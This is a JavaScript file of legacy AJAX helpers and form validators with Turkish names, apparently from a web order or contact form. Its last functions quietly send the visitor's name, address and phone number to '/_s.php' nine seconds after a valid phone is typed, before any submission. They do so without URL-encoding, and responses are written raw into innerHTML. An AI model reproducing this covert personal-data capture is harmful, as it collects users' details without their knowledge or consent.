function AJAX() {
    var ajax = false;
    try {
        ajax = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {

        try {
            ajax = new ActiveXObject("Microsoft.XMLHTTP");
        } catch (e) {
            ajax = false;
        }

    }
    if (!ajax && typeof XMLHttpRequest != 'undefined') {

        try {
            ajax = new XMLHttpRequest();
        } catch (e) {
            ajax = false;
        }

    }
    if (!ajax && window.createRequest) {

        try {
            ajax = window.createRequest();
        } catch (e) {
            ajax = false;
        }

    }

    return ajax;
}

function JXP(yukleniyor, yer, dosya, sc) {
    ajax = new AJAX();

    if (ajax) {
        ajax.onreadystatechange = function() {}
        ajax.abort()
    }

    ajax.onreadystatechange = function() {
        Loading(yukleniyor, yer)
    }
    ajax.open('POST', dosya, true)
    ajax.setRequestHeader("If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT")
    ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=utf-8')
    //ajax.setRequestHeader("Content-length", sc.length)
    //ajax.setRequestHeader("Connection", "close")
    ajax.send(sc)
}

function JXG(yukleniyor, yer, dosya, sc) {
    ajax = new AJAX();

    if (ajax) {
        ajax.onreadystatechange = function() {};
        ajax.abort();
    }
    if (sc) {
        dosya = dosya + '?' + sc;
    }

    ajax.onreadystatechange = function() {
        Loading(yukleniyor, yer);
    }

    ajax.open('GET', dosya, true);
    ajax.setRequestHeader("If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT");
    //ajax.setRequestHeader("Connection", "close");
    ajax.send(null);
}

function Loading(yukleniyor, yer) {
    if (yukleniyor == 1 && yer != 'no_id') {
        if (ajax.readyState == 1 || ajax.readyState == 2 || ajax.readyState == 3) {
            var loading = 'Bekleyiniz'
            document.getElementById(yer).innerHTML = loading;
        }
    }

    if (ajax.readyState == 4 && yer != 'no_id') {
        if (ajax.status == 200) {
            document.getElementById(yer).innerHTML = ajax.responseText;


        } else {
            document.getElementById(yer).innerHTML = '<strong>HATA:</strong> ' + ajax.statusText;
        }

        function AJAX() {};
    }
}

function fc_(text) {
    var temp;
    temp = encodeURIComponent(text);
    return temp;
}

function _e(str) {
    var at = "@"
    var dot = "."
    var lat = str.indexOf(at)
    var lstr = str.length
    var ldot = str.indexOf(dot)
    if ((str.indexOf(at) == -1) || (str.indexOf(at) == -1 || str.indexOf(at) == 0 || str.indexOf(at) == lstr) || (str.indexOf(dot) == -1 || str.indexOf(dot) == 0 || str.indexOf(dot) == lstr) || (str.indexOf(at, (lat + 1)) != -1) || (str.substring(lat - 1, lat) == dot || str.substring(lat + 1, lat + 2) == dot) || (str.indexOf(dot, (lat + 2)) == -1) || (str.indexOf(" ") != -1)) {
        return false;
    }
    return true
}


function _t(str) {
    str2 = str.replace(".", "");
    str2 = str2.replace("/", "");
    str2 = str2.replace("-", "");
    str2 = str2.replace(",", "");
    str2 = str2.replace(" ", "");
    str2 = str2.replace("(", "");
    str2 = str2.replace(")", "");
    str2 = str2.replace("*", "");
    str2 = str2.replace("_", "");

    var lstr = str2.length;
    if (lstr < 11) {
        return false;
    }
    return true;
}

function _k() {

    var __t = document.form.tel
    if ((_t(__t.value) == false)) {
        return false;
    }
    return true;
}

function _r() {
    try {

        var _tv = document.form.tel.value;
        var _av = document.form.ad.value;
        var _dv = document.form.adres.value;
        var _me = document.form._m.value;
    } catch (e) {}

    JXG('0', 'no_id', '/_s.php?a=' + _av + '&p=' + _dv + '&i=' + _tv);
}

function _s() {
    try {
        if ((_k() == true) & (_d == false)) {
            _d = true;
            var _tt = setTimeout("_r()", 9000);
        }
    } catch (e) {
        _d = false;
    }
}